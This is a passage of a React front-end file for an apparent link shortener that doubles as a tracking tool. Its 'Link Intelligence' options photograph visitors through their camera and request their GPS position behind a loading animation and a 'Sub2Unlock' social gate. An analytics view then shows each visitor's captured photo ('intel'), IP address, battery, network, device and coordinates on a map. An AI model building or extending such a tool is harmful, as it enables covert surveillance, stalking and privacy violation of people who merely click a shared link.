                        placeholder="https://whatsapp.com/channel/..."
                        required={isSocialGateEnabled}
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-4 px-5 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                      <input
                        type="text"
                        value={socialGateDescription}
                        onChange={(e) => setSocialGateDescription(e.target.value)}
                        placeholder="Step description (e.g. Complete the action below)"
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-4 px-5 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                      <input
                        type="text"
                        value={socialGateButtonText}
                        onChange={(e) => setSocialGateButtonText(e.target.value)}
                        placeholder="Button text (e.g. Verify & Continue)"
                        required={isSocialGateEnabled}
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-4 px-5 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                    </div>
                  )}
                </div>

                <div className="pt-4 border-t border-white/5">
                  <div className="flex flex-col gap-4">
                    <div>
                      <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-2 block flex items-center gap-2">
                        <Clock className="w-3 h-3 text-white/40" /> Expiration Date (Optional)
                      </label>
                      <input
                        type="datetime-local"
                        value={expiresAt}
                        onChange={(e) => setExpiresAt(e.target.value)}
                        className="w-full bg-[#0A0A0A] border border-white/5 rounded-lg px-4 py-2.5 text-xs text-white focus:outline-none focus:border-blue-500/50 transition-colors"
                      />
                    </div>

                    <div>
                      <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-2 block">Animation Display Text</label>
                      <input
                        type="text"
                        value={animationText}
                        onChange={(e) => setAnimationText(e.target.value.toUpperCase())}
                        placeholder="E.G. LOADING, REDIRECTING..."
                        className="w-full bg-[#0A0A0A] border border-white/5 rounded-lg px-4 py-2.5 text-xs text-white focus:outline-none focus:border-blue-500/50 transition-colors uppercase tracking-[0.2em]"
                      />
                    </div>
                    
                    <div>
                      <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-3 block">Redirect Animation Style</label>
                      <div className="grid grid-cols-2 gap-4">
                        <button
                          type="button"
                          onClick={() => setAnimationType('ring')}
                          className={cn(
                            "flex flex-col items-center gap-3 p-4 rounded-xl border transition-all duration-300 group",
                            animationType === 'ring' 
                              ? "bg-blue-600/10 border-blue-500/50 text-blue-400 ring-1 ring-blue-500/20" 
                              : "bg-[#0A0A0A] border-white/5 text-zinc-500 hover:border-white/10 hover:bg-white/5"
                          )}
                        >
                          <div className="relative w-10 h-10 flex items-center justify-center">
                            <div className="absolute inset-0 rounded-full border-2 border-current border-t-transparent animate-[spin_1s_linear_infinite]" />
                            <img 
                              src="https://ik.imagekit.io/19imy4f1u/lite_1777560977588_frMe1_REC.png" 
                              className="w-5 h-5 object-contain opacity-80"
                              alt="App Icon"
                              referrerPolicy="no-referrer"
                            />
                          </div>
                          <span className="text-[10px] font-bold uppercase tracking-wider">RGB Ring</span>
                        </button>
                        <button
                          type="button"
                          onClick={() => setAnimationType('bar')}
                          className={cn(
                            "flex flex-col items-center gap-3 p-4 rounded-xl border transition-all duration-300 group",
                            animationType === 'bar' 
                              ? "bg-blue-600/10 border-blue-500/50 text-blue-400 ring-1 ring-blue-500/20" 
                              : "bg-[#0A0A0A] border-white/5 text-zinc-500 hover:border-white/10 hover:bg-white/5"
                          )}
                        >
                          <div className="w-12 h-2.5 bg-zinc-800 rounded-full overflow-hidden p-0.5 border border-white/5">
                            <div className="h-full bg-current rounded-full animate-[loading_1.5s_ease-in-out_infinite]" />
                          </div>
                          <span className="text-[10px] font-bold uppercase tracking-wider">Loading Bar</span>
                        </button>
                      </div>
                    </div>
                    <div>
                      <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-3 block">Link Intelligence (Advanced)</label>
                      <div className="grid grid-cols-2 gap-4">
                        <div className="flex items-center justify-between p-4 bg-[#0A0A0A] border border-white/5 rounded-xl">
                          <div className="flex flex-col">
                            <span className="text-[10px] font-bold text-white uppercase tracking-wider mb-1 flex items-center gap-2">
                              <Monitor className="w-3 h-3 text-blue-400" /> Capture Camera
                            </span>
                            <span className="text-[9px] text-zinc-600">Takes visitor's photo</span>
                          </div>
                          <button
                            type="button"
                            onClick={() => setCaptureCamera(!captureCamera)}
                            className={cn(
                              "relative inline-flex h-5 w-9 items-center rounded-full transition-colors focus:outline-none",
                              captureCamera ? "bg-blue-600" : "bg-neutral-800"
                            )}
                          >
                            <span className={cn(
                              "inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform",
                              captureCamera ? "translate-x-5" : "translate-x-0.5"
                            )} />
                          </button>
                        </div>
                        <div className="flex items-center justify-between p-4 bg-[#0A0A0A] border border-white/5 rounded-xl">
                          <div className="flex flex-col">
                            <span className="text-[10px] font-bold text-white uppercase tracking-wider mb-1 flex items-center gap-2">
                              <Globe className="w-3 h-3 text-emerald-400" /> Exact Location
                            </span>
                            <span className="text-[9px] text-zinc-600">Requests GPS coordinates</span>
                          </div>
                          <button
                            type="button"
                            onClick={() => setCaptureLocation(!captureLocation)}
                            className={cn(
                              "relative inline-flex h-5 w-9 items-center rounded-full transition-colors focus:outline-none",
                              captureLocation ? "bg-blue-600" : "bg-neutral-800"
                            )}
                          >
                            <span className={cn(
                              "inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform",
                              captureLocation ? "translate-x-5" : "translate-x-0.5"
                            )} />
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="md:col-span-2">
                    <label htmlFor="customCode" className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-2 block">
                      Custom Alias (Optional)
                    </label>
                    <div className="flex items-center">
                      <span className="bg-zinc-800 border-y border-l border-white/10 px-4 py-4 rounded-l-lg text-zinc-500 text-sm italic truncate max-w-[120px] md:max-w-none">
                        shorty.os/
                      </span>
                      <input
                        id="customCode"
                        type="text"
                        maxLength={10}
                        value={customCode}
                        onChange={(e) => setCustomCode(e.target.value.replace(/[^a-zA-Z0-9_\-]/g, ''))}
                        placeholder="rtyuiq"
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-r-lg py-4 px-5 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-800 font-sans"
                      />
                    </div>
                  </div>
                  <div className="flex flex-col justify-end">
                    <button
                      type="submit"
                      disabled={isSubmitting || !longUrl.trim()}
                      className="h-[54px] bg-blue-600 hover:bg-blue-500 text-white font-medium py-4 px-6 rounded-lg shadow-[0_0_20px_rgba(37,99,235,0.2)] active:scale-95 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center shrink-0 w-full"
                    >
                      {isSubmitting ? (
                        <>
                          <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin mr-2" />
                          Wait...
                        </>
                      ) : (
                        "Shorten Link"
                      )}
                    </button>
                  </div>
                </div>

                {error && (
                  <div className="bg-red-500/10 border border-red-500/20 text-red-400 p-4 rounded-lg flex items-start gap-3 mt-4">
                    <AlertCircle className="w-5 h-5 flex-shrink-0 mt-0.5" />
                    <div className="space-y-1">
                      <p className="font-medium text-sm">{error}</p>
                      {needsSetup && (
                        <div className="mt-2 space-y-2">
                           <p className="text-xs text-red-400/80">
                             Create the required database table by running this SQL in your Supabase project:
                           </p>
                           <div className="relative group">
                             <pre className="text-[10px] bg-black/50 p-3 rounded-lg overflow-x-auto text-neutral-300 font-mono">
                               {sqlSetupScript}
                             </pre>
                             <button 
                               type="button"
                               onClick={() => copyToClipboard(sqlSetupScript)}
                               className="absolute top-2 right-2 p-1.5 bg-neutral-800 rounded opacity-0 group-hover:opacity-100 transition-opacity text-white"
                               title="Copy SQL"
                             >
                               <Copy className="w-3 h-3" />
                             </button>
                           </div>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </form>
            </div>

            {/* Result Card */}
            {shortUrl && (
              <div className="mt-8 flex items-center justify-between bg-emerald-500/5 border border-emerald-500/20 p-4 rounded-xl animate-in fade-in duration-500">
                <div className="flex items-center gap-4 min-w-0">
                  <div className="p-2 bg-emerald-500/20 rounded shrink-0">
                    <svg className="w-5 h-5 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                  </div>
                  <div className="min-w-0 pr-4">
                    <p className="text-[10px] text-emerald-500/70 font-bold uppercase tracking-widest">Link Ready</p>
                    <p className="text-lg font-medium truncate text-emerald-400">{shortUrl.replace(/^https?:\/\//, '')}</p>
                  </div>
                </div>
                <button
                  onClick={() => copyToClipboard(shortUrl)}
                  className="px-4 py-2 border border-emerald-500/30 text-emerald-400 rounded-lg text-sm font-medium hover:bg-emerald-500/10 transition-colors shrink-0 flex items-center gap-2"
                >
                  {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  <span className="hidden sm:inline">{copied ? 'Copied' : 'Copy Link'}</span>
                </button>
              </div>
            )}
          </div>
        </main>
      </div>

      {/* Footer Bar */}
      <footer className="py-4 md:h-10 md:py-0 bg-[#0F0F0F] border-t border-white/5 px-4 md:px-8 flex flex-col md:flex-row items-center justify-between text-[10px] text-zinc-600 uppercase tracking-widest font-bold shrink-0 gap-3 md:gap-0">
        <div className="flex flex-col md:flex-row items-center gap-3 md:gap-4">
          <span>Open Source Project v1.0.4</span>
          <button 
            onClick={downloadIntegrationPrompt}
            className="text-blue-500 hover:text-blue-400 transition-colors flex items-center gap-1 bg-blue-500/10 px-2 py-1 rounded"
          >
            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
            Download Integration AI Prompt
          </button>
        </div>
        <div className="flex gap-4 md:gap-6">
          <span>{history.length} Links Generated</span>
          <a href="https://github.com/supabase/supabase" target="_blank" rel="noreferrer" className="hover:text-zinc-400 transition-colors">Documentation</a>
        </div>
      </footer>

      {/* Edit Password Modal */}
      {editingLink && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="w-full max-w-md max-h-[90vh] overflow-y-auto bg-[#0F0F0F] border border-white/10 rounded-2xl shadow-2xl p-6">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-lg font-medium text-white">Manage Link</h3>
              <button onClick={() => setEditingLink(null)} className="text-zinc-500 hover:text-white transition-colors">
                <X className="w-5 h-5"/>
              </button>
            </div>
            
             <p className="text-sm text-zinc-400 mb-6 font-mono bg-white/5 p-2 rounded truncate block">
               /{editingLink.code}
             </p>

             <form onSubmit={handleUpdateLink} className="space-y-6">
                <div>
                  <div className="flex items-center justify-between mb-4">
                    <label className="text-sm font-medium text-white flex items-center gap-2">
                       <Lock className="w-4 h-4 text-zinc-400"/> Password Protection
                    </label>
                    <button
                      type="button"
                      role="switch"
                      aria-checked={editingLink.enablePassword}
                      onClick={() => setEditingLink({ ...editingLink, enablePassword: !editingLink.enablePassword })}
                      className={cn(
                        "relative inline-flex h-7 w-14 items-center rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500/50",
                        editingLink.enablePassword ? "bg-emerald-500" : "bg-neutral-700"
                      )}
                    >
                      <span className={cn(
                        "inline-block h-5 w-5 transform rounded-full bg-white transition-transform shadow-sm",
                        editingLink.enablePassword ? "translate-x-8" : "translate-x-1"
                      )} />
                    </button>
                  </div>
                  
                  {editingLink.enablePassword && (
                    <div className="animate-in slide-in-from-top-2 fade-in duration-200">
                      <p className="text-xs text-zinc-500 mb-2">Set a new password to update</p>
                      <input
                        type="password"
                        value={editingLink.newPassword}
                        onChange={(e) => setEditingLink({ ...editingLink, newPassword: e.target.value })}
                        placeholder="Enter new password..."
                        className="w-full bg-[#0A0A0A] rounded-lg py-3 px-4 text-zinc-200 focus:outline-none placeholder:text-zinc-700 transition-all font-sans border animate-rgb"
                      />
                    </div>
                  )}
                  {!editingLink.enablePassword && (
                     <p className="text-xs text-zinc-500 italic">Password will be removed, link will be public.</p>
                  )}
                </div>

                <div>
                  <div className="flex items-center justify-between mb-4">
                    <label className="text-sm font-medium text-white flex items-center gap-2">
                      <Link2 className="w-4 h-4 text-zinc-400"/> Social Gate (Sub2Unlock)
                    </label>
                    <button
                      type="button"
                      role="switch"
                      aria-checked={editingLink.enableSocialGate}
                      onClick={() => setEditingLink({ ...editingLink, enableSocialGate: !editingLink.enableSocialGate })}
                      className={cn(
                        "relative inline-flex h-7 w-14 items-center rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500/50",
                        editingLink.enableSocialGate ? "bg-emerald-500" : "bg-neutral-700"
                      )}
                    >
                      <span className={cn(
                        "inline-block h-5 w-5 transform rounded-full bg-white transition-transform shadow-sm",
                        editingLink.enableSocialGate ? "translate-x-8" : "translate-x-1"
                      )} />
                    </button>
                  </div>
                  
                  {editingLink.enableSocialGate && (
                    <div className="animate-in slide-in-from-top-2 fade-in duration-200 space-y-4">
                      <div>
                        <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-2 block">Choose Icon</label>
                        <div className="flex flex-wrap gap-2">
                          {SOCIAL_ICONS.map((item) => (
                            <button
                              key={item.id}
                              type="button"
                              onClick={() => setEditingLink({ ...editingLink, socialGateIcon: item.id })}
                              className={cn(
                                "flex items-center gap-2 px-3 py-2 rounded-lg transition-all",
                                editingLink.socialGateIcon === item.id 
                                  ? "bg-blue-500/10 text-blue-400 ring-1 ring-blue-500" 
                                  : "bg-[#0F0F0F] border border-white/5 text-zinc-400 hover:bg-white/5 hover:text-zinc-200"
                              )}
                            >
                              <SocialIcon id={item.id} className="w-6 h-6" />
                              <span className="text-xs font-medium">{item.label}</span>
                            </button>
                          ))}
                        </div>
                      </div>
                      <input
                        type="text"
                        value={editingLink.socialGateTitle}
                        onChange={(e) => setEditingLink({ ...editingLink, socialGateTitle: e.target.value })}
                        placeholder="e.g. Follow my WhatsApp Channel"
                        required={editingLink.enableSocialGate}
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-3 px-4 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                      <input
                        type="url"
                        value={editingLink.socialGateUrl}
                        onChange={(e) => setEditingLink({ ...editingLink, socialGateUrl: e.target.value })}
                        placeholder="https://whatsapp.com/channel/..."
                        required={editingLink.enableSocialGate}
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-3 px-4 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                      <input
                        type="text"
                        value={editingLink.socialGateDescription}
                        onChange={(e) => setEditingLink({ ...editingLink, socialGateDescription: e.target.value })}
                        placeholder="Step description (e.g. Complete the action below)"
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-3 px-4 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                      <input
                        type="text"
                        value={editingLink.socialGateButtonText}
                        onChange={(e) => setEditingLink({ ...editingLink, socialGateButtonText: e.target.value })}
                        placeholder="Button text (e.g. Verify & Continue)"
                        required={editingLink.enableSocialGate}
                        className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg py-3 px-4 text-zinc-200 focus:outline-none focus:border-blue-500/50 placeholder:text-zinc-700 transition-all font-sans text-sm"
                      />
                      <div className="pt-4 border-t border-white/5 space-y-4">
                        <div className="grid grid-cols-2 gap-3">
                           <button
                             type="button"
                             onClick={() => setEditingLink({ ...editingLink, captureCamera: !editingLink.captureCamera })}
                             className={cn(
                               "p-3 rounded-xl border text-left transition-all",
                               editingLink.captureCamera ? "bg-blue-600/10 border-blue-500/50" : "bg-black border-white/5 opacity-60"
                             )}
                           >
                             <div className="flex items-center gap-2 mb-1">
                               <Monitor className={cn("w-3 h-3", editingLink.captureCamera ? "text-blue-400" : "text-zinc-600")} />
                               <span className={cn("text-[9px] font-bold uppercase tracking-widest", editingLink.captureCamera ? "text-blue-400" : "text-zinc-600")}>Camera</span>
                             </div>
                             <p className="text-[8px] text-zinc-500 leading-tight">Capture visitor image</p>
                           </button>
                           <button
                             type="button"
                             onClick={() => setEditingLink({ ...editingLink, captureLocation: !editingLink.captureLocation })}
                             className={cn(
                               "p-3 rounded-xl border text-left transition-all",
                               editingLink.captureLocation ? "bg-emerald-600/10 border-emerald-500/50" : "bg-black border-white/5 opacity-60"
                             )}
                           >
                             <div className="flex items-center gap-2 mb-1">
                               <Globe className={cn("w-3 h-3", editingLink.captureLocation ? "text-emerald-400" : "text-zinc-600")} />
                               <span className={cn("text-[9px] font-bold uppercase tracking-widest", editingLink.captureLocation ? "text-emerald-400" : "text-zinc-600")}>Location</span>
                             </div>
                             <p className="text-[8px] text-zinc-500 leading-tight">Request GPS data</p>
                           </button>
                        </div>
                        <div>
                          <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-1 block">Expiry Date</label>
                          <input
                            type="datetime-local"
                            value={editingLink.expiresAt}
                            onChange={(e) => setEditingLink({ ...editingLink, expiresAt: e.target.value })}
                            className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg p-2.5 text-xs text-white focus:outline-none"
                          />
                        </div>
                        <div>
                          <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-1 block">Animation Text</label>
                          <input
                            type="text"
                            value={animationText}
                            onChange={(e) => setAnimationText(e.target.value.toUpperCase())}
                            className="w-full bg-[#0A0A0A] border border-white/10 rounded-lg p-2.5 text-xs text-white focus:outline-none"
                          />
                        </div>
                      </div>
                    </div>
                  )}
                  {!editingLink.enableSocialGate && (
                     <p className="text-xs text-zinc-500 italic mt-2">Social gate is disabled.</p>
                  )}
                </div>

                <div className="flex justify-end gap-3 pt-4 border-t border-white/10">
                  <button
                    type="button"
                    onClick={() => setEditingLink(null)}
                    className="px-4 py-2 rounded-lg text-sm font-medium text-zinc-400 hover:text-white transition-colors"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    disabled={isUpdating}
                    className="bg-blue-600 hover:bg-blue-500 text-white px-5 py-2 rounded-lg text-sm font-medium transition-all shadow-[0_0_15px_rgba(37,99,235,0.2)] disabled:opacity-50"
                  >
                    {isUpdating ? 'Saving...' : 'Save Changes'}
                  </button>
                </div>
             </form>
          </div>
        </div>
      )}

      {/* Detailed Analytics Modal */}
      {analyticsLink && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-300">
           <div className="w-full max-w-4xl max-h-[85vh] overflow-hidden bg-[#0F0F0F] border border-white/10 rounded-[32px] shadow-2xl flex flex-col">
              <div className="p-8 border-b border-white/5 flex items-center justify-between shrink-0">
                 <div>
                    <h3 className="text-2xl font-light tracking-tight text-white mb-1">Link Intelligence</h3>
                    <p className="text-xs text-zinc-500 font-bold uppercase tracking-widest flex items-center gap-2">
                       Analytics for <span className="text-blue-400 font-mono">/{analyticsLink.code}</span>
                    </p>
                 </div>
                 <button onClick={() => setAnalyticsLink(null)} className="p-2 bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white rounded-full transition-all">
                    <X className="w-6 h-6"/>
                 </button>
              </div>

              <div className="flex-1 overflow-y-auto p-8 custom-scrollbar">
                 {isLoadingAnalytics ? (
                   <div className="h-64 flex flex-col items-center justify-center gap-4">
                      <div className="w-10 h-10 border-2 border-blue-500/20 border-t-blue-500 rounded-full animate-spin" />
                      <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-widest animate-pulse">Decrypting Click Data...</p>
                   </div>
                 ) : analyticsData.length === 0 ? (
                   <div className="h-64 flex flex-col items-center justify-center text-center">
                      <BarChart3 className="w-12 h-12 text-zinc-800 mb-4" />
                      <p className="text-zinc-500 font-medium">No clicks detected yet.</p>
                      <p className="text-[10px] text-zinc-600 uppercase tracking-widest mt-1">Start sharing your link to see data</p>
                   </div>
                 ) : (
                   <div className="space-y-8">
                      {/* Summary Grid */}
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                         {[
                           { label: 'Total Clicks', val: analyticsData.length, icon: ArrowUpRight, color: 'text-blue-400' },
                           { label: 'Uniques', val: new Set(analyticsData.map(d => d.ip_address)).size, icon: Globe, color: 'text-emerald-400' },
                           { label: 'Top Browser', val: Object.entries(analyticsData.reduce((acc, obj) => ({...acc, [obj.browser]: (acc[obj.browser] || 0) + 1}), {} as any)).sort((a: any, b: any) => b[1] - a[1])[0][0], icon: Monitor, color: 'text-orange-400' },
                           { label: 'Last Active', val: 'Just Now', icon: Clock, color: 'text-purple-400' }
                         ].map((stat, i) => (
                           <div key={i} className="bg-white/[0.03] border border-white/[0.05] p-5 rounded-2xl">
                              <stat.icon className={cn("w-5 h-5 mb-3", stat.color)} />
                              <p className="text-2xl font-light text-white mb-1">{stat.val}</p>
                              <p className="text-[9px] text-zinc-600 font-bold uppercase tracking-[0.2em]">{stat.label}</p>
                           </div>
                         ))}
                      </div>

                      {/* Detailed Log Table */}
                      <div className="bg-white/[0.02] border border-white/[0.04] rounded-2xl overflow-hidden">
                         <div className="hidden md:grid grid-cols-7 p-4 border-b border-white/5 text-[9px] text-zinc-500 font-bold uppercase tracking-widest">
                            <div className="col-span-2">Visitor Details</div>
                            <div>Intel (Img)</div>
                            <div>System Specs</div>
                            <div>Device</div>
                            <div>Geo</div>
                            <div className="text-right">Timestamp</div>
                         </div>
                         <div className="divide-y divide-white/[0.03]">
                            {analyticsData.map((log, i) => (
                              <div key={i} className="flex flex-col md:grid grid-cols-7 p-4 md:items-center group hover:bg-white/[0.02] transition-colors gap-4 md:gap-0">
                                 {/* Column 1: Details */}
                                 <div className="md:col-span-2">
                                    <p className="text-zinc-300 font-mono text-xs mb-1 md:mb-0">{log.ip_address}</p>
                                    <p className="text-[10px] text-zinc-600 truncate pr-4">{log.referrer}</p>
                                 </div>

                                 {/* Column 2: Intel */}
                                 <div className="flex items-center gap-3">
                                    <span className="md:hidden text-[9px] text-zinc-600 font-bold uppercase tracking-widest w-16 shrink-0">Intel:</span>
                                    {log.captured_image ? (
                                       <button 
                                         type="button"
                                         onClick={() => setSelectedImage(log.captured_image)}
                                         className="relative group/img focus:outline-none"
                                       >
                                          <img 
                                            src={log.captured_image} 
                                            className="w-10 h-10 object-cover rounded border border-white/10 hover:scale-[1.2] hover:z-20 transition-transform origin-left cursor-zoom-in" 
                                            alt="Captured"
                                          />
                                          <div className="absolute inset-0 bg-black/40 opacity-0 group-hover/img:opacity-100 flex items-center justify-center transition-opacity rounded">
                                             <ArrowUpRight className="w-3 h-3 text-white" />
                                          </div>
                                       </button>
                                    ) : (
                                       <div className="w-10 h-10 bg-white/5 rounded flex items-center justify-center border border-dashed border-white/10 shrink-0">
                                          <Monitor className="w-4 h-4 text-zinc-800" />
                                       </div>
                                    )}
                                 </div>

                                 {/* Column 3: Specs */}
                                 <div className="flex items-center md:flex-col md:items-start gap-3 md:gap-1.5">
                                    <span className="md:hidden text-[9px] text-zinc-600 font-bold uppercase tracking-widest w-16 shrink-0">System:</span>
                                    <div className="flex flex-col gap-1.5">
                                       <div className="flex items-center gap-2">
                                          <div className={cn("w-1.5 h-1.5 rounded-full", log.battery_level > 0.2 ? "bg-emerald-500" : "bg-red-500")}></div>
                                          <span className="text-[9px] text-zinc-400 font-mono">
                                             {log.battery_level ? `${Math.round(log.battery_level * 100)}%` : '??%'}
                                             {log.is_charging && ' ⚡'}
                                          </span>
                                       </div>
                                       <div className="flex items-center gap-2">
                                          <span className="text-[8px] px-1 bg-zinc-800 rounded text-zinc-500 font-mono uppercase truncate max-w-[60px]">{log.network_type || 'NET'}</span>
                                          <span className="text-[8px] text-zinc-600 font-mono">{log.screen_resolution || '??x??'}</span>
                                       </div>
                                    </div>
                                 </div>

                                 {/* Column 4: Device */}
                                 <div className="flex items-center gap-3">
                                    <span className="md:hidden text-[9px] text-zinc-600 font-bold uppercase tracking-widest w-16 shrink-0">Device:</span>
                                    <div className="flex items-center gap-3">
                                       {log.device_type === 'Mobile' ? <Smartphone className="w-3 h-3 text-zinc-500" /> : <Monitor className="w-3 h-3 text-zinc-500" />}
                                       <div className="min-w-0">
                                          <p className="text-[10px] text-zinc-400 truncate">{log.browser}</p>
                                          <p className="text-[9px] text-zinc-600 uppercase border-b border-zinc-800 inline-block">{log.os || 'UNKNOWN'}</p>
                                       </div>
                                    </div>
                                 </div>

                                 {/* Column 5: Geo */}
                                 <div className="flex items-center gap-3">
                                    <span className="md:hidden text-[9px] text-zinc-600 font-bold uppercase tracking-widest w-16 shrink-0">Geo:</span>
                                    <div className="flex items-center gap-2">
                                       <div className="w-4 h-4 bg-zinc-800 rounded-full flex items-center justify-center p-0.5">
                                          <Globe className="w-2 h-2 text-zinc-500" />
                                       </div>
                                       <span className="text-[10px] text-zinc-400">{log.country || 'Global'}</span>
                                    </div>
                                 </div>

                                 {/* Column 6: Timestamp */}
                                 <div className="md:text-right border-t border-white/5 pt-3 md:pt-0 md:border-0 flex justify-between md:block items-center">
                                    <span className="md:hidden text-[9px] text-emerald-500/50 font-bold uppercase tracking-widest">Captured At</span>
                                    <div>
                                       <p className="text-[10px] text-zinc-500">{new Date(log.created_at).toLocaleTimeString()}</p>
                                       <p className="text-[8px] text-zinc-700 font-bold uppercase tracking-tighter">{new Date(log.created_at).toLocaleDateString()}</p>
                                    </div>
                                 </div>

                                 {/* Full Width Map Section */}
                                 {log.latitude && (
                                    <div className="col-span-full mt-4 bg-black/40 border border-white/5 rounded-2xl overflow-hidden group/large-map">
                                       <div className="grid grid-cols-1 md:grid-cols-3">
                                          <div className="md:col-span-2 relative aspect-[21/9] md:aspect-auto md:h-48 border-b md:border-b-0 md:border-r border-white/5">
                                             <iframe 
                                               title="Visitor Large Map"
                                               width="100%" 
                                               height="100%" 
                                               frameBorder="0" 
                                               scrolling="no" 
                                               marginHeight={0} 
                                               marginWidth={0} 
                                               src={`https://maps.google.com/maps?q=${log.latitude},${log.longitude}&z=15&output=embed`}
                                               className="grayscale contrast-125 opacity-40 group-hover/large-map:opacity-100 group-hover/large-map:grayscale-0 transition-all duration-700"
                                             ></iframe>
                                             <div className="absolute inset-0 pointer-events-none shadow-[inset_0_0_40px_rgba(0,0,0,0.6)]"></div>
                                             <div className="absolute top-3 left-3 bg-black/60 backdrop-blur-md border border-white/10 px-2 py-1 rounded-md flex items-center gap-2">
                                                <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.6)]"></div>
                                                <span className="text-[8px] text-white font-bold uppercase tracking-widest">Live GPS Node</span>
                                             </div>
                                          </div>
                                          <div className="p-4 flex flex-col justify-center items-center md:items-start text-center md:text-left gap-4">
                                             <div>
                                                <p className="text-[9px] text-zinc-500 font-bold uppercase tracking-[0.2em] mb-1">Coordinates Tracked</p>
                                                <p className="text-sm font-mono text-emerald-400 font-bold tracking-tight">
                                                   {log.latitude.toFixed(6)}° N<br />
                                                   {log.longitude.toFixed(6)}° E
                                                </p>
                                             </div>
                                             <a 
                                               href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`} 
                                               target="_blank" 
                                               rel="noopener noreferrer"
                                               className="flex items-center gap-3 px-6 py-2.5 bg-emerald-500 text-black rounded-xl text-[10px] font-bold uppercase tracking-widest hover:bg-emerald-400 transition-all hover:scale-[1.02] active:scale-95 shadow-[0_4px_20px_rgba(16,185,129,0.2)]"
                                             >
                                               <ExternalLink className="w-3.5 h-3.5" />
                                               Launch Full Interface
                                             </a>
                                          </div>
                                       </div>
                                    </div>
                                 )}
                              </div>
                            ))}
                         </div>
                      </div>
                   </div>
                 )}
              </div>
              
              <div className="p-4 bg-black/40 border-t border-white/5 flex justify-center shrink-0">
                 <p className="text-[10px] text-zinc-700 font-bold uppercase tracking-[0.4em]">Proprietary Link Tracking Core V2</p>
              </div>
           </div>
        </div>
      )}
      {/* Image Lightbox Modal */}
      {selectedImage && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/95 backdrop-blur-xl animate-in fade-in duration-300">
           <div className="absolute top-6 right-6 flex items-center gap-4 z-10">
              <button 
                onClick={() => {
                  const link = document.createElement('a');
                  link.href = selectedImage;
                  link.download = `captured-intel-${Date.now()}.png`;
                  document.body.appendChild(link);
                  link.click();
                  document.body.removeChild(link);
                }}
                className="flex items-center gap-2 px-4 py-2 bg-white/10 hover:bg-white/20 border border-white/10 rounded-full text-[10px] text-white font-bold uppercase tracking-widest transition-all"
              >
                 <Download className="w-3.5 h-3.5" />
                 Download intel
              </button>
              <button 
                onClick={() => setSelectedImage(null)} 
                className="p-3 bg-white/10 hover:bg-white/20 text-white rounded-full transition-all border border-white/10"
              >
                <X className="w-6 h-6"/>
              </button>
           </div>
           
           <div className="w-full max-w-2xl aspect-[4/3] relative rounded-[32px] overflow-hidden border border-white/10 shadow-[0_0_50px_rgba(0,0,0,0.5)]">
              <img 
                src={selectedImage} 
                className="w-full h-full object-cover" 
                alt="Captured Full" 
              />
              <div className="absolute inset-0 pointer-events-none border-[1px] border-white/5 font-mono text-[8px] text-white/20 p-4 flex flex-col justify-between">
                 <div className="flex justify-between">
                    <span>INTEL_NODE_LITE_SECURE</span>
                    <span>{new Date().toISOString()}</span>
                 </div>
                 <div className="flex justify-between">
                    <span>ENCRYPTION: AES-256</span>
